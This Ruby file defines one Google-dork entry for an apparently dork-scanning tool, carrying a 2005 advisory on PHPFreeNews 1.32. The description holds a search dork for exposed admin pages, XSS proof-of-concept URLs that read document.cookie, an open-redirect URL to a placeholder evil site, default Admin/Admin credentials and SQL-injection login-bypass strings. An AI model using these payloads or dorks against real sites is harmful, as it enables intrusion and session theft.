module Dorks
   class Dork1053 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 1053",
            ghdb_url: "https://www.exploit-db.com/ghdb/1053",
            severity: "3",
            category: "vulnerable_files",
            publish_date: "2005-08-07",
            author: "anonymous",
            dork: <<~EDORK,
PHPFreeNews inurl:Admin.php
EDORK
            description: <<~EDESC
29/07/2005 8.36.03PHPFreeNews Version 1.32 (& previous) sql injection/login bypass, cross site scripting, path disclosure, information disclosure author site: http://www.phpfreenews.co.uk/Main_Intro.phpxss poc:http://[target]/[path]/inc/Footer.php?ScriptVersion=alert(document.cookie)http://[target]/[path]/inc/ScriptFunctions.php?FullNewsDisplayMode=3&NewsDir=")}//-->alert(document.cookie)http://[target]/[path]/inc/ScriptFunctions.php?EnableRatings=1&NewsDir=")}//-->alert(document.cookie)http://[target]/[path]/inc/ScriptFunctions.php?EnableComments=1&NewsDir=")}//-->alert(document.cookie)http://[target]/[path]/inc/ScriptFunctions.php?FullNewsDisplayMode=3&PopupWidth=")}//-->alert(document.cookie)http://[target]/[path]/inc/ScriptFunctions.php?FullNewsDisplayMode=3&PopupHeight=")}//-->alert(document.cookie)http://[target]/[path]/inc/ScriptFunctions.php?EnableComments=1&PopupWidth=")}//-->alert(document.cookie)http://[target]/[path]/inc/ScriptFunctions.php?EnableComments=1&PopupHeight=")}//-->alert(document.cookie)also a user can craft a url to redirect a victim to an evil site:http://[target]/[path]/inc/Logout.php?AdminScript=http://[evil_site]/[evil_script]path disclosure:http://[target]/[path]/inc/ArchiveOldNews.phphttp://[target]/[path]/inc/Categories.phphttp://[target]/[path]/inc/CheckLogout.phphttp://[target]/[path]/inc/CommentsApproval.phphttp://[target]/[path]/inc/Images.phphttp://[target]/[path]/inc/NewsList.phphttp://[target]/[path]/inc/Password.phphttp://[target]/[path]/inc/Post.phphttp://[target]/[path]/inc/PostsApproval.phphttp://[target]/[path]/inc/PurgeOldNews.phphttp://[target]/[path]/inc/SetSticky.phphttp://[target]/[path]/inc/SetVisible.phphttp://[target]/[path]/inc/Statistics.phphttp://[target]/[path]/inc/Template.phphttp://[target]/[path]/inc/UserDefinedCodes.phphttp://[target]/[path]/inc/Users.phpinformation disclosure:googledork:PHPFreeNews inurl:Admin.php(with this, you can passively fingerprint the server, PHP & MySQL version are in Google description...because this info are shownwed with non-chalance in admin.php page ;) )default password:login: Adminpass: AdminMySQL Injection / Login Bypass in previous versions:login: Adminpassword: ') or isnull(1/0) or ('a'='anote: all string, not consider 'or'in 1.32 version LoginUsername and LoginPassword vars are addslashed... but, try this: login: whateverpass: //') or isnull(1/0) /* this is definetely patched in 1.40 version
EDESC
         })

      end
   end
end
